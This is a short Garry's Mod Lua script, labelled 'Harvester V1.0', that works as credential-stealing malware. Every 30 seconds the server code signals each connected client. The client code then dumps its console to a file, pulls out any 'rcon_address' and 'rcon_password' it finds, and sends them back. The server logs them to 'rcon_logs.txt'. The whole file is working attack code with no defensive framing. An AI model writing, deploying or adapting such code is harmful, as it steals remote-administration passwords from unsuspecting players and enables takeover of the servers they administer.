--[[
	SHRUN/rcon.lua
	{LTF}Deadpool
	===DStream===
]]

if SERVER then
 
    AddCSLuaFile("rcon.lua")
     
    concommand.Add("sendshit" , function(p,c,a)
        filex.Append("rcon_logs.txt" , "\n"..a[1].." -- "..a[2])
    end )
     
    timer.Create("It's harvest time!" , 30 , 0 , function()
        umsg.Start("herpderpin")
        umsg.End()
    end )
     
    MsgN("[RCON] Harvester V1.0 active!")
    return
end
 
usermessage.Hook("herpderpin" , function(um)
    RunConsoleCommand("condump")
    timer.Simple(2,function()
        local files = file.Find("../condump*.txt")
        local latest = files[#files]
         
        local cdump = file.Read("../"..latest)
         
        local server = cdump:match("rcon_address (.-)\n")
        local pass = cdump:match("rcon_password (.-)\n")
        if pass then
            RunConsoleCommand("sendshit" , server or "127.0.0.1" , pass)
            MsgN(server.."|"..pass)
        end
    end )
end )